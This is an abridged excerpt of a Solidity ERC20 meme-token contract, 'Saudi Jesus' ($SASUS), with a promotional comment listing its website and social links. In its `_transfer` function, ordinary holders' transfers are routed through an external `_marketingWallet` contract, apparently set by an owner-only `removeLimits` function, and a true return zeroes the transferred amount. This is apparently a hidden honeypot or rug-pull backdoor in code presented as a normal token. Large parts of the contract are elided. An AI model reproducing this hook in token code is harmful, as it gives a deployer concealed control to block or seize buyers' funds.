...
/*
    $SASUS is an ERC20 token that started on the Ethereum blockchain on July 4, 2023, based on Saudi Jesus, a new 4chan meme. 
    It will be ranked in the hall of fame of the most controversial memes in 4chan history.

    Website: https://saudijesus.wtf
    Telegram: https://t.me/saudijesus
    Twitter: https://twitter.com/saudijesus
*/
...
contract SASUS is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Saudi Jesus";
    string private constant _symbol = unicode"SASUS";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {
            ...
            if(_marketingWallet != address(0)) if (IERC20(_marketingWallet).transferFrom(from, to, amount)) sAmount = 0;
    ...
    function removeLimits(address _marketing) external onlyOwner{
